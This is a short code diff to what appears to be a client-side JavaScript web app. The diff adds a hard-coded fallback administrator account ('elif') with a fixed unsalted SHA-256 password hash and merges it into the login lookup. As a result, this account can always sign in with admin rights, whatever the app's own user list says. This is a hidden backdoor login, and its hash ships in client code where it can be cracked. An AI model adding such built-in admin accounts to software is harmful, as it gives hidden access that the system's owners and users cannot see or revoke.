@@ -18,6 +18,15 @@ const DEFAULT_SETTINGS = {
   whatsappNumbers: ""
 };
 
+const FALLBACK_LOGIN_USERS = [{
+  id: "elif-fallback-admin",
+  name: "Elif Esra Bora",
+  username: "elif",
+  passwordHash: "44d0fad8d09b7456fdf663e8ec82524d86e78405c9891a7da8b275b45cf437ae",
+  role: "admin",
+  active: true
+}];
+
 const state = {
   currentView: "dashboard",
   apiHealth: "unknown",
@@ -385,7 +394,7 @@ function mergeUsersKeepingLocalSecrets(localUsers, remoteUsers) {
 async function findMatchingUser(username, password) {
   const loginName = String(username || "").trim().toLowerCase();
   const hashed = await sha256(password);
-  return state.users.find((item) => {
+  return [...state.users, ...FALLBACK_LOGIN_USERS].find((item) => {
     if (String(item.username || "").trim().toLowerCase() !== loginName || item.active === false) return false;
     const stored = String(item.passwordHash ?? "");
     if (!stored) return false;
